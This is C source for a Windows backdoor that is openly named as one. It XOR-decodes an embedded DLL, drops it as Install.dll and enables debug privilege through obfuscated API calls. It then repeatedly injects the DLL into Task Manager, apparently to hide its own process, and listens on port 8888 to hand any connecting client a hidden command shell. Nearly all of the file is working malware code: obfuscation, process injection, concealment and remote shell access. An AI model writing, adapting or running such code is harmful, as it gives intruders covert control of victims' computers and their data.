//Coded by LJX

#include "backdoor.h"

int init() {
	WSADATA wsadata;
	if (WSAStartup(MAKEWORD(2, 2), &wsadata) != 0) {
		//WSAStartup Failed
		WSACleanup();
		exit(-1);
	}
}

void ErrorClose(SOCKET* sock) {
	closesocket(sock);
	WSACleanup();
	exit(-1);
}


void decodeString(unsigned char* str, int param_key) {
	int length = strlen(str);

	//decode
	for (int i = 0; i < length; i++) {
		*(str + i) = *(str + i) ^ param_key;
	}
}

void decodeDLL(unsigned char* binary, int length, int param_key, int param_sub_key) {
	//decode
	for (int i = 0; i < length; i++) {
		binary[i] = binary[i] ^ param_sub_key;
	}

	for (int i = 0; i < length; i++) {
		binary[i] = binary[i] ^ param_key;
	}
}


DWORD DataSend(sk* Psk) {
	char Buffer[BUFSIZE] = { 0, };
	DWORD dwSize;
	while (1) {
		ReadFile(Psk->handle, Buffer, sizeof(Buffer), &dwSize, NULL);
		Buffer[dwSize] = '\0';
		send(Psk->Sock, Buffer, dwSize, 0);
		memset(Buffer, 0x00, BUFSIZE);
	}
}

BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) {

	/*Function Allocation & Decode data*/
	decodeString(ADVAPIDLL, KEY);
	HANDLE AdvapiDll = LoadLibraryA(ADVAPIDLL);

	decodeString(OPENPROCESSTOKEN, KEY);
	decodeString(LOOKUPPRIVILEGEVALUEW, KEY);
	decodeString(ADJUSTTOKENPRIVILEGES, KEY);

	pOpenProcessToken = (PFOPENPROCESSTOKEN)GetProcAddress(AdvapiDll, OPENPROCESSTOKEN);
	pLookupPrivilegeValueW = (PFLOOKUPPRIVILEGEVALUEW)GetProcAddress(AdvapiDll, LOOKUPPRIVILEGEVALUEW);
	pAdjustTokenPrivileges = (PFADJUSTTOKENPRIVILEGES)GetProcAddress(AdvapiDll, ADJUSTTOKENPRIVILEGES);

	/*Function Allocation & Decode data*/

	TOKEN_PRIVILEGES tp;
	HANDLE hToken;
	LUID luid;

	if (!pOpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
		return FALSE;
	}

	if (!pLookupPrivilegeValueW(NULL, lpszPrivilege, &luid)) {
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	else
		tp.Privileges[0].Attributes = 0;

	//Enable or Disable All Privileges
	if (!pAdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) {
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
		return FALSE;
	}
	return TRUE;
}

BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath) {
	HANDLE hProc, hThread;
	LPVOID pRemoteBuf;
	DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);
	LPTHREAD_START_ROUTINE pThreadProc;

	if (!(hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID))) {
		return FALSE;
	}

	pRemoteBuf = VirtualAllocEx(hProc, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);

	WriteProcessMemory(hProc, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);

	pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");

	hThread = CreateRemoteThread(hProc, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);

	WaitForSingleObject(hThread, 1000);

	VirtualFreeEx(hProc, pRemoteBuf, 0, MEM_RELEASE);

	CloseHandle(hThread);
	CloseHandle(hProc);

	return TRUE;
}

BOOL InjectAllProcess(LPCTSTR szDllPath) {
	while (1) {
		DWORD dwPID = 0;
		HANDLE hSnapshot = INVALID_HANDLE_VALUE;
		PROCESSENTRY32 pe;

		pe.dwSize = sizeof(PROCESSENTRY32);
		hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPALL, NULL);

		Process32First(hSnapshot, &pe);
		BOOL IsTaskMgr = FALSE;
		do {
			dwPID = pe.th32ProcessID;

			if (dwPID < 100) {
				continue;
			}

			//System Process' PID are lower than 100
			if (!_wcsicmp(pe.szExeFile, L"Taskmgr.exe"))
				IsTaskMgr = TRUE;

			if (dwPID > 100 && IsTaskMgr) {
				int iresult = SearchDll(pe.th32ProcessID, szDllPath);
				if (iresult == 0)
					InjectDll(dwPID, szDllPath);
				IsTaskMgr = FALSE;
			}
		} while (Process32Next(hSnapshot, &pe));

		CloseHandle(hSnapshot);
	}
	return TRUE;
}

int SearchDll(DWORD dwPID, LPCTSTR szDllPath) {
	BOOL bMore = FALSE, bFound = FALSE;
	HANDLE hSnapshot, hProc, hThread;
	MODULEENTRY32 me = { sizeof(me) };

	if (INVALID_HANDLE_VALUE == (hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPID)))
		return -1;
	
	bMore = Module32First(hSnapshot, &me);
	for (; bMore; bMore = Module32Next(hSnapshot, &me)) {
		if (!_tcsicmp(me.szModule, szDllPath) || !_tcsicmp(me.szExePath, szDllPath)) {
			bFound = TRUE;
			break;
		}
	}
	if (!bFound) {
		CloseHandle(hSnapshot);
		return 0;
	}
	else {
		return 1;
	}
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nShowCmd) {
	decodeDLL(dllBinary, sizeof(dllBinary), DLL_KEY, DLL_SUBKEY);
	DWORD dwWrite;
	
	HANDLE hFile = CreateFileW(L"Install.dll", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

	if (hFile == INVALID_HANDLE_VALUE) {
		exit(-1);
	}
	if (!WriteFile(hFile, dllBinary, sizeof(dllBinary), &dwWrite, NULL)) {
		CloseHandle(hFile);
		exit(-1);
	}
	CloseHandle(hFile);
	
	TCHAR dllPath[MAX_PATH] = { 0, };
	PFN_SetProcName SetProcName = NULL;
	TCHAR procName[] = L"Installer.exe";

	GetCurrentDirectory(MAX_PATH, dllPath);
	_tcsncat(dllPath, L"\\Install.dll", _tcsclen(L"\\Install.dll"));

	SetPrivilege(SE_DEBUG_NAME, TRUE);


	HANDLE hLib = LoadLibrary(dllPath);
	if (hLib == INVALID_HANDLE_VALUE) {
		exit(-1);
	}
	SetProcName = (PFN_SetProcName)GetProcAddress(hLib, "SetProcName");
	SetProcName(procName);

	DWORD ThreadID;
	if (CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InjectAllProcess, dllPath, 0, &ThreadID) == INVALID_HANDLE_VALUE) {
		FreeLibrary(hLib);
		exit(-1);
	}

	//WSADATA initialization
	init();

	//Socket Create
	SOCKET Server_Sock, Client_Sock;

	//Server Setting
	SOCKADDR_IN Server_Addr, Client_Addr;
	memset(&Server_Addr, 0x00, sizeof(Server_Addr));
	Server_Addr.sin_family = AF_INET;
	Server_Addr.sin_addr.s_addr = inet_addr("0.0.0.0");
	Server_Addr.sin_port = htons(atoi("8888"));

	while (1) {
		Server_Sock = socket(AF_INET, SOCK_STREAM, 0);
		if (Server_Sock == INVALID_SOCKET) {
			//Socket Create Failed
			exit(-1);
		}

		//Binding
		if (bind(Server_Sock, (const struct sockaddr*)&Server_Addr, sizeof(Server_Addr)))
			ErrorClose(&Server_Sock);

		//Listening
		if (listen(Server_Sock, 5) == SOCKET_ERROR)
			ErrorClose(&Server_Sock);

		int fromLen = sizeof(Client_Addr);
		Client_Sock = accept(Server_Sock, (void*)&Client_Addr, &fromLen);
		if (Client_Sock == SOCKET_ERROR)
			ErrorClose(&Server_Sock);

		closesocket(Server_Sock);
		decodeString(PATH, KEY);
		
		STARTUPINFOA si = { 0, };
		PROCESS_INFORMATION pi = { 0, };

		SECURITY_ATTRIBUTES sa;

		sa.nLength = sizeof(SECURITY_ATTRIBUTES);
		sa.lpSecurityDescriptor = NULL;
		sa.bInheritHandle = TRUE;

		HANDLE StdInput_In = NULL, StdInput_Out = NULL;
		HANDLE StdOutput_In = NULL, StdOutput_Out = NULL;

		CreatePipe(&StdInput_Out, &StdInput_In, &sa, 0);
		CreatePipe(&StdOutput_Out, &StdOutput_In, &sa, 0);

		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		si.hStdInput = StdInput_Out;
		si.hStdOutput = StdOutput_In;
		si.hStdError = StdOutput_In;
		si.wShowWindow = SW_HIDE;

		CreateProcessA(NULL, PATH, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);

		char welcomeLabel[] = "[ Welcome ]\r\n";
		send(Client_Sock, welcomeLabel, (sizeof(welcomeLabel) * sizeof(char)), 0);

		sk SK;
		SK.handle = StdOutput_Out;
		SK.Sock = Client_Sock;

		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)DataSend, &SK, 0, NULL);

		char Buffer[BUFSIZE] = { 0, };
		DWORD dwSize;
		while (1) {
			int iResult = 0;

			iResult = recv(Client_Sock, Buffer, sizeof(Buffer), 0);
			if (iResult == 0 || iResult == SOCKET_ERROR) {
				TerminateProcess(pi.hProcess, 0);
				break;
			}
			WriteFile(StdInput_In, Buffer, strlen(Buffer), &dwSize, NULL);
			memset(Buffer, 0x00, BUFSIZE);
		}
	}
	FreeLibrary(hLib);
	return 0;
}